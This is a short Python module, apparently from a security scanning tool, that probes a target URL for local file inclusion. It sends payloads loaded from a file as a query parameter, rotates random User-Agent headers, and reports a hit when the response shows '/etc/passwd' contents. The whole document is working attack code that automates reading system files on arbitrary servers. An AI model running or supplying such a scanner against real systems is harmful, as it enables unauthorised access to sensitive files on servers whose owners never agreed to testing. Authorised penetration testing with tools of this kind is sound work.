import requests
import random

def load_payloads(path="core/payloads/lfi_payloads.txt"):
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def get_random_user_agent():
    with open("data/user_agents.txt", "r") as f:
        return random.choice(f.read().splitlines())

def scan_lfi(target_url, param="file", logger=print):
    payloads = load_payloads()
    headers = {"User-Agent": get_random_user_agent()}
    logger(f"[>] Scanning {target_url} for LFI on parameter '{param}'")

    for payload in payloads:
        test_url = f"{target_url}?{param}={payload}"
        try:
            r = requests.get(test_url, headers=headers, timeout=8)
            if "root:x" in r.text or "etc/passwd" in r.text:
                logger(f"[!!] Possible LFI found with payload: {payload}")
        except Exception as e:
            logger(f"[X] Error with payload {payload}: {e}")
